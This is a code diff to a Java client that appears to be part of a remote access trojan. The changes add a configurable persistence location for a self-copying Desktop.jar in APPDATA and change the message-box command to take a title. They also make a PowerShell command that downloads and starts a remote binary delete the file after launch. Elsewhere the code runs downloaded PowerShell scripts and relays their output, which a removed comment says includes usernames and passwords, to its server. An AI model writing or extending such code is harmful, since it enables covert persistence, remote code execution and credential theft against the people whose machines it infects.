@@ -35,6 +35,7 @@ public class Client {
     private static File directory;
     private static DataInputStream dis;
     private static boolean keyLogger = false;
+    private static String persistenceDir = System.getenv("APPDATA")+ "\\Desktop.jar";
     private static String aesKey = "";
 
     private static String keyLogFile = System.getProperty("java.io.tmpdir") + "log.txt";
@@ -93,10 +94,10 @@ public class Client {
 
     private void saveClient() {
         File client = new File(getClass().getProtectionDomain().getCodeSource().getLocation().getFile());
-        if (SYSTEMOS.contains("Windows")) {
-            File newClient = new File(System.getenv("APPDATA")+ "\\Desktop.jar");
+        if (SYSTEMOS.contains("Windows") && !new File(persistenceDir).exists()) {
+            File newClient = new File(persistenceDir);
             copyFile(client, newClient);
-            createPersistence(System.getenv("APPDATA") + "\\Desktop.jar");
+            createPersistence(persistenceDir);
         }
     }
 
@@ -180,7 +181,8 @@ public class Client {
                     for (String w : split) {
                         toSet.append(w).append(" ");
                     }
-                    showMessagebox(toSet.toString());
+                    String title = toSet.toString().split("::::::::::")[1];
+                    showMessagebox(toSet.toString().split("::::::::::")[0], title);
                 } else if (input.equals("SYINFO")) {
                     /*
                     "SYINFO" NOT A TYPO!!!!! Prevents clash with "SYS" command
@@ -304,7 +306,7 @@ public class Client {
 
                     try(BufferedInputStream in = new BufferedInputStream(url.openStream());
                         FileOutputStream fileOutputStream = new FileOutputStream(fname)){
-                        byte dataBuffer[] = new byte[2048];
+                        byte[] dataBuffer = new byte[2048];
                         int bytesRead;
                         while ((bytesRead = in.read(dataBuffer, 0, 2048)) != -1){
                             fileOutputStream.write(dataBuffer, 0, bytesRead);
@@ -318,10 +320,8 @@ public class Client {
 
                     String cmd = "powershell.exe . " + fname;
                     if (debugMode){System.out.println("Command: " + cmd);}
-                    // Run the command
-                    // TODO: fix >> CLIENT SIDE << bug below
-                    // For some reason, the lines are being truncated at around 117-120 char mark, completely cutting off most usernames and passwords
 
+                    // Run the command
                     File outFile = new File(System.getProperty("java.io.tmpdir") + "GCDout.csv");
                     outFile.createNewFile();
                     ProcessBuilder builder = new ProcessBuilder(cmd.split(" "));
@@ -337,7 +337,6 @@ public class Client {
                     BufferedReader stdInput = new BufferedReader(new FileReader(outFile));
                     String s = null;
                     while ((s = stdInput.readLine()) != null){
-                        System.out.println("In while");
                         communicate(s);
                         if (debugMode){System.out.println("Got line: " + s);}
                     }
@@ -358,7 +357,7 @@ public class Client {
                     socket.close();
 
                     // Start new client
-                    Process proc = Runtime.getRuntime().exec("java -jar " + fname);
+                    Runtime.getRuntime().exec("java -jar " + fname);
                     if (debugMode) { System.out.println("Exiting"); }
                     System.exit(0);
 
@@ -386,7 +385,7 @@ public class Client {
                     String fname = randTextAlpha(8) + url.substring(url.lastIndexOf('.'));
                     // Attempts to download and execute a binary. If it is successful, send back `1`, else `0`.
                     if (SYSTEMOS.contains("Windows")){
-                        String cmd = "PowerShell [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-Object System.Net.WebClient).DownloadFile('" + url + "', '.\\" + fname + "');Start-Process '" + fname + "'";
+                        String cmd = "PowerShell [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-Object System.Net.WebClient).DownloadFile('" + url + "', '.\\" + fname + "');Start-Process '" + fname + "';Remove-Item -force " + fname;
                         if (debugMode){System.out.println("CMD: " + cmd);}
                         Runtime.getRuntime().exec(cmd);
                         communicate(0);
@@ -549,7 +548,7 @@ public class Client {
                 stringBuilder.append(line);
             }
             String[] settings = stringBuilder.toString().split(" ");
-            if (settings.length == 7) {
+            if (settings.length == 8) {
                 HOST = (settings[0]);
                 // Change domain to ip
                 try{
@@ -564,6 +563,9 @@ public class Client {
                 debugMode = (Boolean.parseBoolean(settings[4]));
                 aesKey = settings[5];
                 keyLogger = (Boolean.parseBoolean(settings[6]));
+                if (!settings[7].equals("{{DEFAULT}}")) {
+                    persistenceDir = settings[7];
+                }
             }
         } catch (IOException e) {
             if (debugMode) {
@@ -701,17 +703,17 @@ public class Client {
         communicate(sb.toString());
     }
 
-    private void showMessagebox(String msg){
+    private void showMessagebox(String msg, String title){
         if(debugMode){
             System.out.println("Showing messagebox with message: " + msg);
         }
         JFrame.setDefaultLookAndFeelDecorated(true);
-        JFrame frame = new JFrame("ALERT");
+        JFrame frame = new JFrame(title);
         frame.setAlwaysOnTop(true);
         frame.setAutoRequestFocus(true);
         frame.setEnabled(true);
 
-        JOptionPane.showMessageDialog(frame, msg, "ALERT", JOptionPane.INFORMATION_MESSAGE);
+        JOptionPane.showMessageDialog(frame, msg, title, JOptionPane.INFORMATION_MESSAGE);
     }
 
     public void doWebDelivery(String url, String target){
